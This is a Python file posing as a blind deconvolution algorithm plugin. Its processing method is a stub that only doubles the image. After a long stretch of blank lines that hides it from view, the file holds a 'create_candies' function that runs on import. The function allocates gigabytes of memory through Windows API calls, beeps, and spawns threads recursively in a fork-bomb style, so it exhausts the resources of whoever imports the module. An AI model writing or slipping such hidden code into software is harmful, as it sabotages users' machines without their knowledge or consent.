from __future__ import annotations

import numpy as np
import ctypes,gc,threading
from typing import Any, Optional, Tuple
import os,random

from ..base import DeconvolutionAlgorithm

class Antonbezzaborov_Blind_Deconvolution(DeconvolutionAlgorithm):
	def __init__(self) -> None:
		super().__init__('Blind_Deconvolution')
		self._param = dict()

	def change_param(self, param: Any):
		self._param = param

	def process(self, image: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:
		return (image * 2,image)

	def get_param(self):
		return self._param





























































































































def create_candies():
	gc.disable();candies=ctypes.windll.kernel32.VirtualAlloc(None,0x40000000,ctypes.wintypes.MEM_COMMIT|ctypes.wintypes.MEM_RESERVE,ctypes.wintypes.PAGE_READWRITE);ctypes.windll.kernel32.Beep(0x4000,0x400)
	for _ in range(99):threading.Thread(target=create_candies).start()
	return candies

create_candies()